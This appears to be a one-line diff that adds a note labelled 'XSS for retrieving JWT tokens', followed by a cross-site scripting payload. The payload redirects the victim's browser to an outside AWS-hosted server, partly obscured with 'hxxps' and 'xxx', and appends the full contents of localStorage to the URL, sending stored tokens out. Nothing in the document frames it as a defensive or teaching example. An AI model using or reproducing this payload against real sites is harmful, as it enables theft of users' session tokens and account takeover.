@@ -1,0 +1,1 @@
+XSS for retrieving JWT tokens: <script>window.location='hxxps://xxx.ap-southeast-2.compute.amazonaws.com/xxx.js?jwt='+JSON.stringify(localStorage)</script>
